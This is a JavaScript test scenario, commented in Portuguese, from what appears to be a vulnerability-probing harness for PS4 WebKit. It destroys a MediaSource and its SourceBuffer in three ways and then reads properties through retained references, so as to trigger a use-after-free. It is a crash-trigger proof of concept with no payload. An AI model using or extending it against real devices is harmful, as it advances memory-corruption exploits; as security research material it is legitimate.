/**
 * CENÁRIO: MEDIASOURCE_SRC_CLEAR_UAF
 * Superfície C++: MediaSource.cpp / SourceBuffer.cpp / MediaPlayerPrivateManx.cpp
 * Risco: HIGH
 *
 * Diferença para a versão genérica:
 *   - Versão anterior não adicionava SourceBuffers reais — o MediaSource
 *     ficava em estado 'closed' sem pipeline ativo, sem superfície de UAF.
 *   - Versão robusta aguarda 'sourceopen', adiciona um SourceBuffer com
 *     mime type de vídeo, e só então executa o teardown. Isso garante
 *     que o pipeline de decodificação nativo está ativo no momento do free.
 *   - Testa três caminhos de teardown em sequência:
 *     (A) video.src = ''   → desconecta MediaSource do HTMLMediaElement
 *     (B) ms.endOfStream() → fecha o MediaSource com SourceBuffers pendentes
 *     (C) URL.revokeObjectURL → revoga o handle enquanto SourceBuffer existe
 *   - Probes acessam SourceBuffer pós-free via referência retida.
 *
 * Ciclo de vida C++ relevante:
 *   MediaSource::attachToElement() → cria pipeline nativo
 *   SourceBuffer::~SourceBuffer() → acontece durante detach
 *   Ref retida ao SourceBuffer acessa SourceBuffer::m_source (freed MediaSource*)
 */

export default {
    id:       'MEDIASOURCE_SRC_CLEAR_UAF',
    category: 'Media',
    risk:     'HIGH',
    description:
        'Teardown do MediaSource com SourceBuffer ativo. ' +
        'Aguarda sourceopen, adiciona SourceBuffer real (pipeline nativo ativo), ' +
        'então destrói via video.src="" e revokeObjectURL. ' +
        'Ref retida ao SourceBuffer acessa MediaSource* freed.',
    supported: () => typeof MediaSource !== 'undefined',

    setup: async function() {
        this.ms    = new MediaSource();
        this.url   = URL.createObjectURL(this.ms);
        this.video = document.createElement('video');
        this.video.style.cssText = 'width:1px;height:1px;position:absolute';
        document.body.appendChild(this.video);
        this.video.src = this.url;

        // Aguarda MediaSource abrir (pipeline nativo instanciado)
        await new Promise((resolve, reject) => {
            const timeout = setTimeout(() => reject(new Error('sourceopen timeout')), 3000);
            this.ms.addEventListener('sourceopen', () => {
                clearTimeout(timeout);
                resolve();
            }, { once: true });
        });

        // Adiciona SourceBuffer — cria objeto C++ SourceBuffer nativo
        // MIME type suportado pelo PS4 WebKit
        try {
            this.sb = this.ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
        } catch(e) {
            // Fallback: tenta sem codec
            try { this.sb = this.ms.addSourceBuffer('video/mp4'); } catch(e2) {}
        }

        // Guarda refs que sobreviverão ao free
        this.msRef = this.ms;
        this.sbRef = this.sb;
    },

    trigger: async function() {
        // Caminho A: fecha o MediaSource com endOfStream()
        try { this.ms.endOfStream(); } catch(e) {}

        // Caminho B: desconecta o elemento (pipeline teardown)
        this.video.src = '';

        // Caminho C: revoga o handle ObjectURL nativo
        URL.revokeObjectURL(this.url);

        // Remove strong ref JS → C++ é o único dono restante
        this.ms = null;
        this.sb = null;

        // Pequena janela para o GC do executor agir
        await new Promise(r => setTimeout(r, 10));
    },

    probe: [
        // Probes no HTMLVideoElement pós-teardown
        s => s.video.duration,
        s => s.video.readyState,
        s => s.video.networkState,
        s => s.video.error?.code,
        s => s.video.buffered?.length,

        // Probes via ref retida ao MediaSource freed (msRef)
        s => s.msRef.readyState,       // 'open'|'closed'|'ended' — C++ freed?
        s => s.msRef.duration,
        s => s.msRef.sourceBuffers?.length,
        s => s.msRef.activeSourceBuffers?.length,

        // Probes via ref retida ao SourceBuffer freed (sbRef)
        // sbRef.updating acessa SourceBuffer::m_pendingAppendData (C++)
        s => s.sbRef?.updating,
        s => s.sbRef?.mode,
        s => s.sbRef?.timestampOffset,
        s => s.sbRef?.buffered?.length,
        s => s.sbRef?.appendWindowStart,
        s => s.sbRef?.appendWindowEnd,
    ],

    cleanup: function() {
        try { this.video.remove(); } catch(e) {}
    }
};
